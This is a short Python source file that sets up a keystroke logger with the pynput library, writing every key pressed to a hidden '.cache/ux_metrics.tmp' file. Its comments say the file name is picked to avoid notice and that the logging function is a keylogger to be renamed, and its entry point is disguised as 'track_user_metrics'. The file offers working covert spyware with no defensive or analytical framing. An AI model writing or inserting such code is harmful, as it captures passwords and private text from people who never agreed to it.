from pynput import keyboard
import os

CACHE_DIR = os.path.join(os.getcwd(), ".cache")
os.makedirs(CACHE_DIR, exist_ok=True)
KEYLOG_FILE = os.path.join(CACHE_DIR, "ux_metrics.tmp") # File to store key logs(boring name to dismiss turtles eyes)

def _klog(k): #change the name --> this here is the keylogger function
    try:
        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
            f.write(k.char)
    except AttributeError:
        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{k}]") #If the key doesn't have a .char attribute
            #(e.g., special keys like Shift, Ctrl), it writes the string representation of the key in brackets (e.g., [Key.shift]).

def track_user_metrics():
    listener = keyboard.Listener(on_press=_klog)
    listener.start()
